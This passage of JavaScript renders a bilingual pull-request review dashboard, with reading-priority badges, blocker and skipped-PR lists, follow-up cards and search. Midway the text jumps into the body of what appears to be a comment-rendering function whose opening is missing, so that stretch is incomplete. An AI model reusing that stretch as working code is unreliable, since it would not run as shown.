  const body = text(value);
  if (!body) return "";
  return `<div class="field"><strong>${label}</strong><div class="field-body">${formatRich(body)}</div></div>`;
}

function renderBlockers(item) {
  const blockers = Array.isArray(item.blockers) ? item.blockers : [];
  if (!blockers.length) return "";
  const isNonBlockerList = blockers.every(blocker => {
    const kind = typeof blocker === "object" && blocker !== null ? String(blocker.kind || "") : "";
    return kind === "not_reached";
  });
  const detailLabel = isNonBlockerList
    ? labels[lang].nonBlockerDetails
    : labels[lang].blockerDetails;
  const rendered = blockers.map(blocker => {
    const data = typeof blocker === "object" && blocker !== null
      ? blocker
      : { summary: blocker };
    const location = [data.path, data.line ? `:${data.line}` : ""].filter(Boolean).join("");
    const meta = [
      data.kind ? blockerKindLabel(data.kind) : "",
      data.reviewer ? `reviewer: ${text(data.reviewer)}` : "",
      location,
      data.latest_response ? `latest: ${text(data.latest_response)}` : "",
      data.verification ? text(data.verification) : ""
    ].filter(Boolean).join(" · ");
    const summary = formatRich(data.summary || blocker);
    const link = data.url
      ? ` <a href="${escapeHtml(data.url)}">link</a>`
      : "";
    return `<li class="blocker-item"><div>${summary}${link}</div>${meta ? `<div class="blocker-meta">${escapeHtml(meta)}</div>` : ""}</li>`;
  }).join("");
  return `<div class="skip-detail"><strong>${detailLabel}:</strong></div><ul class="blocker-list">${rendered}</ul>`;
}

function blockerKindLabel(kind) {
  return (labels[lang].blockerKinds || {})[kind] || text(kind);
}

  function inlineCommentText(comment) {
    if (comment === undefined || comment === null) return "";
    if (typeof comment !== "object" || Array.isArray(comment)) {
      return text(comment);
    }
    if (lang === "zh") {
      return text(comment.summary_zh || comment.summary || comment.body || comment.message || "");
    }
    return text(comment.body || comment.summary_en || comment.summary || comment.message || "");
  }

function allPrText(item) {
  const comments = (item.inline_comments || []).map(comment => [
    comment.severity,
    comment.focus,
    comment.body,
    comment.summary,
    comment.path
  ].map(value => text(value)).join(" ")).join(" ");
  const blockers = blockersSearchText(item.blockers);
  return [
    item.status,
    item.number,
    item.title,
    item.author,
    item.problem,
    item.necessity_assessment,
    item.evidence_checked,
    item.reproduction_on_base,
    item.issue_evidence_gaps,
    item.approach,
    item.implementation_derivation,
    item.solution_fit_assessment,
    item.outcome,
    item.risk,
    item.ci_state,
    item.skip_reason,
    item.readiness_audit,
    item.modules,
    item.api_surface,
    comments,
    blockers
  ].map(value => text(value)).join(" ").toLowerCase();
}

function readingAdvice(item) {
  const status = item.status || "skipped";
  const comments = item.inline_comments || [];
  const blockers = item.blockers || [];
  const body = allPrText(item);
  const hasP1 = comments.some(comment =>
    /\bP[01]\b/i.test(text(comment.severity)) ||
    /\bP[01]\b/i.test(inlineCommentText(comment))
  );
  const hasCriticalRisk = hasP1 ||
    /(security|安全|bypass|绕过|breaking|破坏性|unbounded|无界|丢失|重复|不稳定|兼容|api|go-apidiff|failure|失败|不能 merge|不能合入|race|并发)/i.test(body);
  const highImpactFeature =
    /(add|new|新增|support|支持|agent|runner|session|memory|graphrag|knowledge|openapi|workspace_exec|policy|extension|tool|graph|api)/i.test(body);

  const copy = {
    critical: {
      icon: "🔥",
      zh: "重点精读",
      en: "Deep Read",
      reasonZh: comments.length
        ? `有 ${comments.length} 条行级评论，且包含 P1/兼容/正确性/安全类风险。`
        : "包含高风险兼容性或正确性信号，需要重点复核。",
      reasonEn: comments.length
        ? `${comments.length} inline comment(s), including P1, compatibility, correctness, or security risk.`
        : "High-risk compatibility or correctness signal; review carefully."
    },
    focus: {
      icon: "🔎",
      zh: "建议细看",
      en: "Read Carefully",
      reasonZh: comments.length
        ? `有 ${comments.length} 条评论或重要设计取舍，建议看完整结论。`
        : "涉及核心模块、导出 API 或较大功能，建议细看。",
      reasonEn: comments.length
        ? `${comments.length} comment(s) or important design tradeoffs; read the full conclusion.`
        : "Core module, exported API, or larger feature; read carefully."
    },
    skim: {
      icon: "✅",
      zh: "快速略看",
      en: "Quick Skim",
      reasonZh: "风险低或改动较直接，扫结论和 CI 状态即可。",
      reasonEn: "Low risk or straightforward change; skim outcome and CI state."
    },
    follow: {
      icon: "⏳",
      zh: "只看阻塞",
      en: "Blocker Only",
      reasonZh: blockers.length
        ? `主要看 ${blockers.length} 个具体阻塞点，暂不需要读完整实现。`
        : "当前不是可合并状态，先看阻塞和后续动作。",
      reasonEn: blockers.length
        ? `Focus on ${blockers.length} concrete blocker(s); no need to read the full implementation yet.`
        : "Not merge-ready; focus on blockers and next action."
    }
  };

  let level = "skim";
  if (status === "blocked") {
    level = "follow";
  } else if (status === "commented") {
    level = hasCriticalRisk ? "critical" : "focus";
  } else if (status === "maintained") {
    level = hasCriticalRisk || highImpactFeature ? "focus" : "skim";
  } else if (status === "approved") {
    level = hasCriticalRisk || highImpactFeature ? "focus" : "skim";
  } else if (status === "merged") {
    level = highImpactFeature || hasCriticalRisk ? "focus" : "skim";
  } else if (status === "skipped") {
    level = blockers.length || /(conflict|ci|failure|失败|未回应|review)/i.test(body)
      ? "follow"
      : "skim";
  }

  const selected = copy[level];
  return {
    level,
    icon: selected.icon,
    label: lang === "zh" ? selected.zh : selected.en,
    reason: lang === "zh" ? selected.reasonZh : selected.reasonEn
  };
}

function priorityRank(level) {
  return { critical: 4, focus: 3, follow: 2, skim: 1 }[level] || 0;
}

function renderReadingGuide(items) {
  const panel = document.getElementById("readingGuidePanel");
  const container = document.getElementById("readingGuide");
  const candidates = [
    ...items.filter(item => (item.status || "skipped") !== "skipped"),
    ...(reportData.follow_up || []).map(item => {
      if (typeof item === "object" && item !== null && !Array.isArray(item)) {
        return { ...item, status: item.status || "blocked" };
      }
      const body = text(item);
      return { title: body, next: body, status: "blocked", plain: true };
    })
  ].map(item => ({ item, advice: readingAdvice(item) }))
    .filter(entry => entry.advice.level !== "skim")
    .sort((left, right) => priorityRank(right.advice.level) - priorityRank(left.advice.level));

  if (!candidates.length) {
    panel.style.display = "none";
    container.innerHTML = "";
    return;
  }

  panel.style.display = "block";
  container.innerHTML = candidates.slice(0, 9).map(entry => {
    const item = entry.item;
    const advice = entry.advice;
    const prText = item.number ? `#${item.number}` : "PR";
    const prLink = item.url
      ? `<a href="${escapeHtml(item.url)}">${prText} · ${escapeHtml(text(item.title))}</a>`
      : `<span>${prText} · ${escapeHtml(text(item.title))}</span>`;
    return `
      <article class="guide-card ${advice.level}">
        <div class="guide-meta">
          <span class="read-pill ${advice.level}">${advice.icon} ${escapeHtml(advice.label)}</span>
          <span class="badge ${item.status || "skipped"}">${labels[lang][item.status] || item.status || labels[lang].skipped}</span>
        </div>
        <div>${prLink}</div>
        <div class="guide-reason">${escapeHtml(advice.reason)}</div>
      </article>
    `;
  }).join("");
}

        </div>
        <div>${formatRich(inlineCommentText(data))}</div>
        ${data.focus ? `<div><strong>${labels[lang].focus}:</strong> ${escapeHtml(text(data.focus))}</div>` : ""}
        ${data.severity ? `<div><strong>${labels[lang].severity}:</strong> ${escapeHtml(text(data.severity))}</div>` : ""}
      </div>
    `;
  }).join("");
  return `<section class="comments-panel">
    <h4>${labels[lang].inlineComments}</h4>
    <div class="comment-list">${rendered}</div>
  </section>`;
}

function renderPrReadout(item) {
  const story = [
    storyBlock(labels[lang].backgroundAndProblem, [
      storyLine(labels[lang].technicalBackground, item.technical_background),
      storyLine(labels[lang].problem, item.problem),
      storyLine(labels[lang].necessityAssessment, item.necessity_assessment),
      storyLine(labels[lang].evidenceChecked, item.evidence_checked),
      storyLine(labels[lang].reproductionOnBase, item.reproduction_on_base),
      storyLine(labels[lang].issueEvidenceGaps, item.issue_evidence_gaps),
      storyLine(labels[lang].problemFraming, item.problem_framing),
      storyLine(labels[lang].rootCause, item.root_cause)
    ], "hero-block"),
    storyBlock(labels[lang].solutionAndTradeoffs, [
      storyLine(labels[lang].approach, item.approach),
      storyLine(labels[lang].implementationDerivation, item.implementation_derivation),
      storyLine(labels[lang].solutionFitAssessment, item.solution_fit_assessment),
      storyLine(labels[lang].alternativeDesigns, item.alternative_designs),
      storyLine(labels[lang].tradeoffs, item.tradeoffs),
      storyLine(labels[lang].designAssessment, item.design_assessment)
    ]),
    storyBlock(labels[lang].impactAndEvidence, [
      storyLine(labels[lang].changeInventory, item.change_inventory),
      storyLine(labels[lang].semanticChanges, item.semantic_changes),
      storyLine(labels[lang].behaviorImpact, item.behavior_impact),
      storyLine(labels[lang].moduleImpact, item.module_impact),
      storyLine(labels[lang].crossModuleImpact, item.cross_module_impact)
    ]),
    renderComments(item)
  ].filter(Boolean).join("");
  return `<div class="pr-readout"><div class="pr-story">${story}</div>${renderReviewRail(item)}</div>`;
}

function renderCards() {
  const query = document.getElementById("search").value.trim();
  const visible = prs().filter(item => (item.status || "skipped") !== "skipped")
    .filter(item => {
    const status = item.status || "skipped";
    return (filter === "all" || status === filter) && matchesSearch(item, query);
  });
  const container = document.getElementById("cards");
  if (!visible.length) {
    container.innerHTML = `<div class="empty">${labels[lang].empty}</div>`;
    return;
  }
  container.innerHTML = visible.map(item => {
    const status = item.status || "skipped";
    const advice = readingAdvice(item);
    const summary = compactSummary(item);
    const prText = item.number ? `#${item.number}` : "PR";
    const prLink = item.url
      ? `<a href="${escapeHtml(item.url)}">${prText}</a>`
      : prText;
    return `
      <article class="card priority-${advice.level}" data-status="${status}">
        <div class="card-head">
          <div>
            <div class="headline-row">
              <h3 class="card-title">${prLink} · ${escapeHtml(text(item.title))}</h3>
              <span class="read-pill ${advice.level}">${advice.icon} ${escapeHtml(advice.label)}</span>
            </div>
            <div class="meta">
              <span>${labels[lang].author}: ${escapeHtml(item.author || "")}</span>
              <span class="advice-reason">${escapeHtml(advice.reason)}</span>
            </div>
            <div class="card-summary">${formatRich(summary)}</div>
          </div>
          <div class="card-actions">
            <span class="badge ${status}">${labels[lang][status] || status}</span>
            <button class="card-toggle" type="button" aria-expanded="false">${labels[lang].expandDetails}</button>
          </div>
        </div>
        <div class="card-body">
          ${renderPrReadout(item)}
        </div>
      </article>
    `;
  }).join("");
  document.querySelectorAll(".card-head").forEach(head => {
    head.addEventListener("click", event => {
      if (event.target.closest("a")) return;
      const card = head.closest(".card");
      setCardOpen(card, !card.classList.contains("open"));
    });
  });
  document.querySelectorAll(".card").forEach(card => updateCardToggle(card));
}

function renderSkipGroups() {
  const heading = document.getElementById("skippedHeading");
  const container = document.getElementById("skipGroups");
  if (!["all", "skipped"].includes(filter)) {
    heading.style.display = "none";
    container.style.display = "none";
    return;
  }
  heading.style.display = "flex";
  container.style.display = "grid";
  const query = document.getElementById("search").value.trim();
  const groups = skippedGroups().map(group => {
    const reason = group.reason || "";
    const title = lang === "zh"
      ? text(group.title_zh || group.title || group.reason)
      : text(group.title_en || group.title || group.reason);
    const items = (group.items || []).map(item => ({
      ...item,
      status: item.status || "skipped",
      group_reason: reason,
      skip_reason: item.skip_reason || reason
    })).filter(item => matchesSearch(item, query));
    return { reason, title, items };
  }).filter(group => group.items.length > 0);
  if (!groups.length) {
    container.innerHTML = `<div class="empty">${labels[lang].empty}</div>`;
    return;
  }
  container.innerHTML = groups.map((group, index) => `
    <article class="skip-group open">
      <div class="skip-group-head" data-skip-group="${index}">
        <h3 class="skip-group-title">${escapeHtml(text(group.title || group.reason))}</h3>
        <span class="skip-group-count">${group.items.length} ${labels[lang].items}</span>
      </div>
      <div class="skip-group-body">
        ${group.items.map(item => {
          const prText = item.number ? `#${item.number}` : "PR";
          const prLink = item.url
            ? `<a href="${escapeHtml(item.url)}">${prText}</a>`
            : prText;
          return `
            <div class="skip-row">
              <div>
                <div class="skip-title">${prLink} · ${escapeHtml(text(item.title))}</div>
                <div class="skip-detail">${labels[lang].author}: ${escapeHtml(item.author || "")}</div>
              </div>
              <div>
                <div><strong>${labels[lang].reason}:</strong> ${formatRich(text(item.skip_reason))}</div>
                ${item.readiness_audit ? `<div class="skip-detail"><strong>${labels[lang].readinessAudit}:</strong> ${formatRich(text(item.readiness_audit))}</div>` : ""}
                ${item.necessity_assessment ? `<div class="skip-detail"><strong>${labels[lang].necessityAssessment}:</strong> ${formatRich(text(item.necessity_assessment))}</div>` : ""}
                ${item.evidence_checked ? `<div class="skip-detail"><strong>${labels[lang].evidenceChecked}:</strong> ${formatRich(text(item.evidence_checked))}</div>` : ""}
                ${item.reproduction_on_base ? `<div class="skip-detail"><strong>${labels[lang].reproductionOnBase}:</strong> ${formatRich(text(item.reproduction_on_base))}</div>` : ""}
                ${item.issue_evidence_gaps ? `<div class="skip-detail"><strong>${labels[lang].issueEvidenceGaps}:</strong> ${formatRich(text(item.issue_evidence_gaps))}</div>` : ""}
                ${item.implementation_derivation ? `<div class="skip-detail"><strong>${labels[lang].implementationDerivation}:</strong> ${formatRich(text(item.implementation_derivation))}</div>` : ""}
                ${item.solution_fit_assessment ? `<div class="skip-detail"><strong>${labels[lang].solutionFitAssessment}:</strong> ${formatRich(text(item.solution_fit_assessment))}</div>` : ""}
                ${renderBlockers(item)}
                ${item.ci_state ? `<div class="skip-detail">${formatRich(text(item.ci_state))}</div>` : ""}
                ${item.risk ? `<div class="skip-detail">${formatRich(text(item.risk))}</div>` : ""}
              </div>
            </div>
          `;
        }).join("")}
      </div>
    </article>
  `).join("");
  document.querySelectorAll("[data-skip-group]").forEach(head => {
    head.addEventListener("click", () => {
      head.closest(".skip-group").classList.toggle("open");
    });
  });
}

function renderFollowUp() {
  const heading = document.getElementById("followUpHeading");
  const container = document.getElementById("followUpCards");
  if (!["all", "skipped", "blocked"].includes(filter)) {
    heading.style.display = "none";
    container.style.display = "none";
    return;
  }
  const query = document.getElementById("search").value.trim().toLowerCase();
  const items = (reportData.follow_up || []).map(item => {
    if (typeof item === "object" && item !== null && !Array.isArray(item)) return item;
    const body = text(item);
    return {
      title: body,
      next: body,
      plain: true
    };
  }).filter(item => {
    if (!query) return true;
    return [
      item.number,
      item.author,
      text(item.title),
      text(item.reason),
      text(item.next)
    ].join(" ").toLowerCase().includes(query);
  });
  if (!items.length) {
    heading.style.display = "none";
    container.style.display = "none";
    return;
  }
  heading.style.display = "flex";
  container.style.display = "grid";
  container.innerHTML = items.map(item => {
    const hasPrIdentity = Boolean(item.number || item.url);
    const prText = item.number ? `#${item.number}` : "PR";
    const prLink = item.url
      ? `<a href="${escapeHtml(item.url)}">${prText}</a>`
      : prText;
    const title = escapeHtml(text(item.title || item.next || item.reason));
    const cardTitle = hasPrIdentity ? `${prLink} · ${title}` : title;
    const meta = item.author
      ? `<div class="meta">${labels[lang].author}: ${escapeHtml(item.author)}</div>`
      : "";
    const body = item.plain
      ? `<div>${formatRich(text(item.next || item.title))}</div>`
      : `<div class="grid">
          ${field(labels[lang].reason, item.reason)}
          ${field(labels[lang].outcome, item.next)}
        </div>`;
    return `
      <article class="card open" data-status="blocked">
        <div class="card-head">
          <div>
            <h3 class="card-title">${cardTitle}</h3>
            ${meta}
          </div>
          <span class="badge blocked">${labels[lang].followups}</span>
        </div>
        <div class="card-body">
          ${body}
        </div>
      </article>
    `;
  }).join("");
}

function renderEvolution() {
  const panel = document.getElementById("evolutionPanel");
  const container = document.getElementById("evolutionList");
  const items = reportData.skill_evolution || [];
  if (!items.length) {
    panel.style.display = "none";
    container.innerHTML = "";
    return;
  }
  panel.style.display = "block";
  container.innerHTML = items.map(item => {
    const data = typeof item === "object" && item !== null && !Array.isArray(item)
      ? item
      : { area: labels[lang].selfEvolutionSection, note: item };
    return `
      <article class="evolution-item">
        <div class="evolution-area">${escapeHtml(text(data.area || labels[lang].selfEvolutionSection))}</div>
        <div class="evolution-note">${formatRich(text(data.note || data.summary || data.body || ""))}</div>
      </article>
    `;
  }).join("");
}

function render() {
  const items = prs();
  renderStatic();
  renderMetrics(items);
  renderBars(items);
  renderTimeline();
  renderOverview();
  renderReadingGuide(items);
  renderChips();
  renderCards();
  renderSkipGroups();
  renderFollowUp();
  renderEvolution();
}

document.querySelectorAll("[data-lang-button]").forEach(button => {
  button.addEventListener("click", () => setLanguage(button.dataset.langButton));
});
document.getElementById("search").addEventListener("input", () => {
  renderCards();
  renderSkipGroups();
  renderFollowUp();
});
document.getElementById("openAll").addEventListener("click", () => {
  document.querySelectorAll(".card").forEach(card => setCardOpen(card, true));
  document.querySelectorAll(".skip-group").forEach(node => node.classList.add("open"));
});
document.getElementById("closeAll").addEventListener("click", () => {
  document.querySelectorAll(".card").forEach(card => setCardOpen(card, false));
  document.querySelectorAll(".skip-group").forEach(node => node.classList.remove("open"));
});
render();
</script>
</body>
</html>
